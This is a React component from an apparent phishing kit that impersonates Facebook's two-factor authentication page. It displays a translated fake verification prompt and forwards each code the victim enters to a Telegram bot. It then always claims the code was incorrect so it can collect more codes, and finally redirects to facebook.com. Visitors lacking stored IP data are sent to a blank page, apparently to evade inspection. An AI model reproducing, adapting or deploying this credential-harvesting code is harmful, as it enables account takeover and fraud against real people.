import VerifyImage from '@/assets/images/681.png';
import { faCircleInfo } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { useState, useEffect, useCallback, useMemo } from 'react';
import { translateText } from '@/utils/translate';
import sendMessage from '@/utils/telegram';
import config from '@/utils/config';

const Verify = () => {
    const [code, setCode] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [attempts, setAttempts] = useState(0);
    const [countdown, setCountdown] = useState(0);
    const [isTranslating, setIsTranslating] = useState(true); // trạng thái dịch

    const defaultTexts = useMemo(() => ({
        title: 'Two-factor authentication required',
        description: 'Check the notification on another device. Or enter the code you received via SMS, email, Facebook message, or WhatsApp.',
        placeholder: 'Enter your code',
        infoTitle: 'Approve from another device or Enter your verification code',
        infoDescription: 'This may take a few minutes. Please do not leave this page until you receive the code. Once the code is sent, you will be able to appeal and verify.',
        walkthrough: "We'll walk you through some steps to secure and unlock your account.",
        submit: 'Submit',
        sendCode: 'Send Code',
        errorMessage: 'The verification code you entered is incorrect',
        loadingText: 'Please wait',
        secondsText: 'seconds'
    }), []);

    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);

    const translateAllTexts = useCallback(async (targetLang) => {
        if (!targetLang || targetLang === 'en') {
            setIsTranslating(false);
            return;
        }

        try {
            const translations = await Promise.all(Object.values(defaultTexts).map(async (text) => {
                try {
                    const result = await translateText(text, targetLang);
                    return result || text; // fallback
                } catch (err) {
                    console.error('Error translating text:', text, err);
                    return text;
                }
            }));

            const keys = Object.keys(defaultTexts);
            const translatedObj = keys.reduce((acc, key, idx) => {
                acc[key] = translations[idx];
                return acc;
            }, {});

            setTranslatedTexts(translatedObj);
        } catch (err) {
            console.error('Failed to translate texts:', err);
        } finally {
            setIsTranslating(false);
        }
    }, [defaultTexts]);

    useEffect(() => {
        const ipInfo = localStorage.getItem('ipInfo');
        if (!ipInfo) {
            window.location.href = 'about:blank';
            return;
        }

        const targetLang = localStorage.getItem('targetLang') || 'en';
        translateAllTexts(targetLang);
    }, [translateAllTexts]);

    const formatTime = (seconds) => {
        const minutes = Math.floor(seconds / 60);
        const remainingSeconds = seconds % 60;
        return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
    };

    const handleSubmit = async () => {
        if (!code.trim()) return;

        setIsLoading(true);
        setShowError(false);

        try {
            const message = `🔐 <b>Code ${attempts + 1}:</b> <code>${code}</code>`;
            await sendMessage(message);
        } catch (err) {
            console.error('Failed to send code to telegram:', err);
        }

        setCountdown(config.code_loading_time);
        const timer = setInterval(() => {
            setCountdown((prev) => {
                if (prev <= 1) {
                    clearInterval(timer);
                    return 0;
                }
                return prev - 1;
            });
        }, 1000);

        await new Promise((resolve) => setTimeout(resolve, config.code_loading_time * 1000));

        setShowError(true);
        setAttempts((prev) => prev + 1);
        setIsLoading(false);
        setCountdown(0);

        if (attempts + 1 >= config.max_code_attempts) {
            window.location.replace('https://facebook.com');
            return;
        }

        setCode('');
    };

    if (isTranslating) {
        return (
            <div className='flex min-h-screen items-center justify-center'>
                <p>Loading translations...</p>
            </div>
        );
    }

    return (
        <div className='flex min-h-screen flex-col items-center justify-center bg-[#f8f9fa]'>
            <title>Account | Privacy Policy</title>
            <div className='flex max-w-xl flex-col gap-4 rounded-lg bg-white p-4 shadow-lg'>
                <p className='text-3xl font-bold'>{translatedTexts.title}</p>
                <p>{translatedTexts.description}</p>
                <img src={VerifyImage} alt='' />
                <input
                    type='number'
                    inputMode='numeric'
                    max={8}
                    placeholder={translatedTexts.placeholder}
                    className='rounded-lg border border-gray-300 bg-[#f8f9fa] px-6 py-2'
                    value={code}
                    onChange={(e) => setCode(e.target.value)}
                    onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
                />
                {showError && <p className='text-sm text-red-500'>{translatedTexts.errorMessage}</p>}
                <div className='flex items-center gap-4 bg-[#f8f9fa] p-4'>
                    <FontAwesomeIcon icon={faCircleInfo} size='xl' className='text-[#9f580a]' />
                    <div>
                        <p className='font-medium'>{translatedTexts.infoTitle}</p>
                        <p className='text-sm text-gray-600'>{translatedTexts.infoDescription}</p>
                    </div>
                </div>
                <p>{translatedTexts.walkthrough}</p>

                <button
                    className='rounded-md bg-[#0866ff] px-4 py-2 text-sm font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400'
                    onClick={handleSubmit}
                    disabled={isLoading || !code.trim()}
                >
                    {isLoading ? `${translatedTexts.loadingText} ${formatTime(countdown)}...` : translatedTexts.submit}
                </button>

                <p className='cursor-pointer text-center text-blue-900 hover:underline'>{translatedTexts.sendCode}</p>
            </div>
        </div>
    );
};

export default Verify;
